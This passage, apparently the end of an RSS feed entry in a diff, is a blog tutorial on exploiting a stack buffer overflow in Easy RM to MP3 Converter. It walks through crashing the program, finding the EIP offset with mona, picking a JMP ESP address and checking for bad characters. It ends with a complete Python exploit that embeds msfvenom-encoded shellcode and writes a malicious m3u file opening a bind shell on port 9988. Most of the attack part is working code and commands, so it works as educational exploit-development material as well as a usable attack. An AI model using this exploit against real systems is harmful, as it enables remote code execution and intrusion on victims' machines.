+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;lineno&#34;&gt;1 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;30000&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;2 &lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;3 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;evil.m3u&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;4 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evilfile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filename&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;5 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evilfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;6 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evilfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id=&#34;identifying-eip-offset:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Identifying EIP Offset&lt;/h1&gt;
+
+&lt;p&gt;Subsequently, open up the resulting playlist in the converter.
+Boom, the application crashes.&lt;/p&gt;
+
+
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/initial_crash.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Register values at the access violation. EIP was overwritten with AAAA&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/initial_crash.png&#34; alt=&#34;Register values at the access violation. EIP was overwritten with AAAA&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;It seems that we can simply overwrite EIP.
+In order to identify the correct offset of the overflow let&amp;rsquo;s create a pattern and start again.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona pc 5000&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;For this run 25k As are followed by the pattern.
+This time we directly start the application via Immunity.
+The application crashes and we now have a unique pattern stored in EIP.&lt;/p&gt;
+
+
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/find_pattern.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Identifying the offset of EIP with a unique pattern.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/find_pattern.png&#34; alt=&#34;Identifying the offset of EIP with a unique pattern.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;When the debugger stops because of the overflow we can identify the correct offset for our custom EIP.&lt;/p&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona findmsp&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/findmsp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Mona helps in identifying the offset for the EIP overwrite (offset 1109).&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/findmsp.png&#34; alt=&#34;Mona helps in identifying the offset for the EIP overwrite (offset 1109).&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+
+
+&lt;p&gt;The offset for EIP is 25000 + 1109 = 26109.
+Subsequently, this allows an update of the exploit script in order to reflect the newly acquired knowledge.
+This gives us power over EIP.&lt;/p&gt;
+
+&lt;p&gt;
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/overwrite_EIP.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Verifying the offset by overwriting EIP with BBBB.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/overwrite_EIP.png&#34; alt=&#34;Verifying the offset by overwriting EIP with BBBB.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+&lt;/p&gt;
+
+&lt;h1 id=&#34;controlling-eip:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Controlling EIP&lt;/h1&gt;
+
+&lt;p&gt;The next step is to jump to a shellcode.
+Mona helps finding an appropriate address in memory.&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona jmp -r esp&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/jmp_esp.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Moan.py lists the possible JMP ESP instructions.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/jmp_esp.png&#34; alt=&#34;Moan.py lists the possible JMP ESP instructions.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+&lt;/p&gt;
+
+&lt;p&gt;For this exploit the instruction at 0x77c72eee was chosen.
+This allows us to jump to ESP.&lt;/p&gt;
+
+&lt;h1 id=&#34;identifying-bad-characters:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Identifying Bad Characters&lt;/h1&gt;
+
+&lt;p&gt;As ESP points to 0x000FF730 (EIP+4) we can place our shellcode at the specific location.
+Before generating a payload, we also have to check for &lt;strong&gt;bad characters&lt;/strong&gt;.
+Mona also provides help and can create an array with excluded characters.&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona bytearray -b &amp;#39;\x00\x0A&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;The array has to be included in the buffer.
+Subsequently, bad characters can be identified in a debugger.&lt;/p&gt;
+
+&lt;p&gt;
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/bad_chars.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;The byte array in memory is used to identify bad characters.&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/bad_chars.png&#34; alt=&#34;The byte array in memory is used to identify bad characters.&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+&lt;/p&gt;
+
+&lt;p&gt;Mona also provides a command to help with this step of exploit development.&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;!mona compare -f bytearray.bin&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;h1 id=&#34;adding-shellcode:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Adding Shellcode&lt;/h1&gt;
+
+&lt;p&gt;After iterating the above process in order to identify all bad characters a payload can be create.
+Metasploit provides numerous payloads to choose from.
+Most importantly, the payload has to be encoded as to eliminate any bad characters.&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;go&#34;&gt;msfvenom -p windows/console_bind_tcp LPORT=9988 -f python --platform win --arch x86 -b &amp;#39;\x00\x0a\x0d&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;h1 id=&#34;the-exploit:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;The Exploit&lt;/h1&gt;
+
+&lt;p&gt;Following this, the payload has to be added to the exploit script.
+The final step is to create the malicious m3u file and manually load it into the software.&lt;/p&gt;
+
+&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;lineno&#34;&gt; 1 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/python -w&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 2 &lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 3 &lt;/span&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 4 &lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 5 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#-------------------------------------------------------------------------------------------------------#&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 6 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# msfvenom -p windows/console_bind_tcp LPORT=9988 -f python --platform win --arch x86 -b &amp;#39;\x00\x0A\x0D&amp;#39; #&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 7 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)                                          #&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 8 &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#-------------------------------------------------------------------------------------------------------#&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt; 9 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;10 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xdb\xd0\xbb\x36\xcc\x70\x15\xd9\x74\x24\xf4\x5a\x33\xc9\xb1&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;11 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x22\x2e\x85\xe9\xa2\x27&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;12 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x66\x12\x32\x58\xee\xf7\x03\x4a\x94\x7c\x31\x5a\xde\xd1\xb9&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;13 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x11\xb2\xc1\x4a\x57\x1b\xe5\xfb\xd2\x7d\xc8\xfc\xd2\x41\x86&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;14 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x3e\x74\x3e\xd5\x12\x56\x7f\x16\x67\x97\xb8\x4b\x87\xc5\x11&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;15 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x07\x35\xfa\x16\x55\x85\xfb\xf8\xd1\xb5\x83\x7d\x25\x41\x3e&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;16 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x7f\x76\xf9\x35\x37\x6e\x72\x11\xe8\x8f\x57\x41\xd4\xc6\xdc&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;17 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xb2\xae\xd8\x34\x8b\x4f\xeb\x78\x40\x6e\xc3\x75\x98\xb6\xe4&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;18 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x65\xef\xcc\x16\x18\xe8\x16\x64\xc6\x7d\x8b\xce\x8d\x26\x6f&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;19 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xee\x42\xb0\xe4\xfc\x2f\xb6\xa3\xe0\xae\x1b\xd8\x1d\x3b\x9a&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;20 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x0f\x94\x7f\xb9\x8b\xfc\x24\xa0\x8a\x58\x8b\xdd\xcd\x05\x74&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;21 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x78\x85\xa4\x61\xfa\xc4\xa0\x46\x31\xf7\x30\xc0\x42\x84\x02&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;22 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x4f\xf9\x02\x2f\x18\x27\xd4\x50\x33\x9f\x4a\xaf\xbb\xe0\x43&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;23 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x74\xef\xb0\xfb\x5d\x8f\x5a\xfc\x62\x5a\xcc\xac\xcc\x34\xad&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;24 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x1c\xad\xe4\x45\x77\x22\xdb\x76\x78\xe8\x6a\xb1\xb6\xc8\x3f&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;25 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x56\xbb\xee\x98\xa2\x32\x08\x8c\xba\x12\x82\x38\x79\x41\x1b&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;26 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xdf\x82\xa3\x37\x48\x15\xfb\x51\x4e\x1a\xfc\x77\xfd\xb7\x54&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;27 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x10\x75\xd4\x60\x01\x8a\xf1\xc0\x48\xb3\x92\x9b\x24\x76\x02&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;28 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x9b\x6c\xe0\xa7\x0e\xeb\xf0\xae\x32\xa4\xa7\xe7\x85\xbd\x2d&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;29 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x1a\xbf\x17\x53\xe7\x59\x5f\xd7\x3c\x9a\x5e\xd6\xb1\xa6\x44&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;30 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xc8\x0f\x26\xc1\xbc\xdf\x71\x9f\x6a\xa6\x2b\x51\xc4\x70\x87&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;31 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x3b\x80\x05\xeb\xfb\xd6\x09\x26\x8a\x36\xbb\x9f\xcb\x49\x74&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;32 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x48\xdc\x32\x68\xe8\x23\xe9\x28\x18\x6e\xb3\x19\xb1\x37\x26&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;33 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x18\xdc\xc7\x9d\x5f\xd9\x4b\x17\x20\x1e\x53\x52\x25\x5a\xd3&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;34 &lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x8f\x57\xf3\xb6\xaf\xc4\xf4\x92&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;35 &lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;36 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;26109&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;37 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;struct&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;&amp;lt; L&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x77c72eee&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# jmp esp [msv1_0.dll] &lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;38 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x90&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;25&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;39 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;40 &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;quot;C&amp;quot;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;30000&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;41 &lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;42 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;quot;evil.m3u&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;43 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evilfile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filename&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;44 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evilfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;lineno&#34;&gt;45 &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;evilfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;p&gt;By loading the m3u file, the payload is executed.&lt;/p&gt;
+
+&lt;p&gt;
+
+&lt;figure &gt;
+    &lt;a href=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/bind_shell.png&#34; data-lightbox=&#34;default&#34; data-title=&#34;Local listening services before and after bind shell is started by opening the custom m3u file&#34; &gt;
+        &lt;img src=&#34;http://camelinc.info/img/post/2014/easy-rm-to-mp3-converter/bind_shell.png&#34; alt=&#34;Local listening services before and after bind shell is started by opening the custom m3u file&#34; &gt;
+    &lt;/a&gt;
+&lt;/figure&gt;
+
+&lt;/p&gt;
+
+&lt;h1 id=&#34;links-and-references:2fa3dea1838e5e913d9862f6536a17e3&#34;&gt;Links and References&lt;/h1&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/exploits/9186/&#34;&gt;EDB-ID: 9186&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.exploit-db.com/exploits/10374/&#34;&gt;EDB-ID: 10374&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://blog.pusheax.com/2013/03/exploit-writing-stack-based-buffer.html&#34;&gt;Exploit writing tutorial part 1 : Stack Based Overflows&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
